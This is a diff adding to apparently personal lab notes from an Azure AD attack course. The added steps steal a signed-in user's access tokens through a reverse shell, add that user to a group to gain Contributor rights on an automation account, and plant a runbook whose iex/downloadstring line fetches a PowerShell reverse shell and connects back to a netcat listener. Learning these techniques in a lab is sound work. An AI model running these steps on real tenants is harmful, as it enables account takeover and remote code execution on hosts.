@@ -618,3 +618,92 @@ Home> Automation Accounts> HybridAutomation | Runbooks
   - Azure Sandbox - spins up temporary container to execute code
   - Hybrid Runbook Worker - An installed agent on a non-azure machine i.e., on-prem, GCP - runs as SYSTEM on Windows; nxautomation on Linux
     - therefore if we can find a hybrid workers group and we can create runbooks we effectively have RCE on that host
+
+#### Az CLI Recon
+- make sure you have a [shell]() from before
+- Now see whos logged in:
+```az ad signed-in-user show```
+
+- No surprise that the user Mark is using az cli from their workstation.
+- The tasks tells us to find another user or group that has interesting permissions on an automation account.
+
+```
+az extension add --upgrade -n automation
+az automation account list
+```
+
+- check for objects owned by the current user:
+```az ad signed-in-user list-owned-objects```
+
+- To be able to interact with Azure AD, request a token for the ms-graph. We can use that token with the MS Graph module: 
+```az account get-access-token --resource-type ms-graph```
+
+- Now that we have his token, we can use it from our student VM, not rely on the brittle Reverse shell:
+```
+$Token = “eyJ0..”
+Connect-MgGraph -AccessToken
+```
+- Now, let's add Mark as a member of the group. In the below command ```–GroupId``` is for the group object id.
+```
+$params = @{"@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3"}
+New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParameter $params
+```
+
+- Now, we can use az cli to check for automation accounts. Run the below command on the reverse shell:
+```az automation account list```
+
+- Now, we should be able to list roles assigned to Mark using ```az role assignment list --assignee MarkDWalden@defcorphq.onmicrosoft.com``` on the reverse shell but it does not return an output.
+- Therefore, we request an access token for ARM and use the one for aad-graph that we requested earlier and use both with Az PowerShell.
+- Run the below command on the reverse shell to request an access token for ARM:
+```az account get-access-token```
+
+ - To request an access token for add-graph:
+```az account get-access-token --resource-type aad-graph```
+
+Use the below command for using both the tokens with Az PowerShell on student VM: 
+```
+PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
+PS C:\AzAD\Tools> $AccessToken = 'eyJ0…'
+
+PS C:\AzAD\Tools> Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
+```
+
+Run the below command to get the role for Mark (added to the Aumtation Accounts group) on the automation account: 
+```
+PS C:\AzAD\Tools> Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
+```
+
+- Sweet! The above output means Mark has Contributor role on the automation account. We can create and execute Runbooks!
+- Use the below command to check if a hybrid worker group is in use by the automation account:
+```
+PS C:\AzAD\Tools> Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
+```
+
+- Import ```C:\AzAD\Tools\studentx.ps1``` as a PowerShell runbook. This script downloads the Invoke-PowerShellTCP.ps1 reverse shell from your student VM and runs on the hybrid worker.
+```
+iex (New-Object Net.Webclient).downloadstring("http://172.16.x.x:82/Invoke-PowerShellTcp.ps1") Power -Reverse -IPAddress 172.16.x.x -Port 4444
+```
+
+- Host the ```Invoke-PowerShellTCP.ps1``` by copying it to the ```C:\xampp\htdocs``` and starting Apache using xampp.
+- Run the below command in the PowerShell session where you connected using the access token for Mark. It may take couple of minutes:
+```
+PS C:\AzAD\Tools> Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
+```
+
+- Publish the runbook so that we can use it:
+```
+PS C:\AzAD\Tools> Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+```
+
+- Start a netcat listener on your student VM. Remember to listen on the port that you specified in the runbook studentx:
+```
+PS C:\AzAD\Tools> C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
+```
+
+Finally, start the runbook: 
+```
+PS C:\AzAD\Tools> Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+```
+
+On the listener, you should see a connect back and we can execute commands!
+
